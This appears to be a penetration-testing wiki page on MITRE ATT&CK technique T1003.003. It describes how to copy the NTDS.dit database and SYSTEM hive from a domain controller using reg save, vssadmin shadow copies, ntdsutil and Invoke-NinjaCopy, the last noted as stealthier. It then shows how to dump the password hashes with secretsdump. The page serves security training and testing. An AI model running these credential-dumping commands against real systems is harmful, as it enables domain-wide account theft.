---
description: MITRE ATT&CK™ Sub-technique T1003.003
---

# NTDS.dit

NTDS \(Windows NT Directory Services\) is the directory services used by Microsoft Windows NT to locate, manage, and organize network resources. The NTDS.dit file is a database that stores the Active Directory data \(including users, groups, security descriptors and password hashes\). This file is stored on the domain controllers.

Once the secrets are extracted, they can be used for various attacks : [credential spraying](../password-spraying.md), [stuffing](../stuffing.md), [shuffling](../credential-shuffling.md), [cracking](../cracking.md), [pass-the-hash](../../abusing-lm-and-ntlm/pass-the-hash.md), [overpass-the-hash](../../abusing-kerberos/overpass-the-hash.md) or [silver or golden tickets](../../abusing-kerberos/forged-tickets.md).

## Exfiltration

Since the NTDS.dit is constantly used by AD processes such as the Kerberos KDC, it can't be copied like any other file. In order to exfiltrate it from a live domain controller and extract password hashes from it, many techniques can be used.

Just like with [SAM & LSA secrets](sam-and-lsa-secrets.md), the SYSTEM registry hive contains enough info to decrypt the NTDS.dit data. The hive file \(`\system32\config\system`\) can either be exfiltrated the same way the NTDS.dit file is, or it can be exported with `reg save HKLM\SYSTEM 'C:\Windows\Temp\system.save'`.

### Volume Shadow Copy \(VSSAdmin\)

VSS \(Volume Shadow Copy\) is a Microsoft Windows technology, implemented as a service, that allows to create backup copies of files or volumes, even when they are in use. The following command will create the shadow copy and will print two values that will be used later : the ID and the Name of the shadow copy.

```bash
vssadmin create shadow /for=C:
```

Once the VSS is created for the target drive, it is then possible to copy the target files from it.

```bash
copy $ShadowCopyName\Windows\NTDS\NTDS.dit C:\Windows\Temp\ntds.dit.save
```

Once the required files are exfiltrated, the shadow copy can be removed

```bash
vssadmin delete shadows /shadow=$ShadowCopyId
```

### AD maintenance \(NTDSUtil\)

NTDSUtil.exe is a diagnostic tool available as part of Active Directory. It has the ability to save a snapshot of the Active Directory data. Running the following command will copy the NTDS.dit database and the SYSTEM and SECURITY hives to `C:\Windows\Temp`.

```bash
ntdsutil "ac i ntds" "ifm" "create full C:\Windows\Temp" quit quit
```

### NTFS structure parsing

[Invoke-NinjaCopy](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) is a PowerShell script part of the PowerSploit suite able to "copy files off an NTFS volume by opening a read handle to the entire volume \(such as c:\) and parsing the NTFS structures. **This technique is stealthier than the others**.

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\NTDS\NTDS.dit" -LocalDestination "C:\Windows\Temp\ntds.dit.save"
```

## Secrets dump

Once the required files are exfiltrated, they can be parsed by tools like [secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) \(Python, part of [Impacket](https://github.com/SecureAuthCorp/impacket/)\) or [gosecretsdump](https://github.com/c-sto/gosecretsdump) \(Go, faster for big files\).

```text
secretsdump -ntds ntds.dit.save -system system.save LOCAL
gosecretsdump -ntds ntds.dit.save -system system.save
```

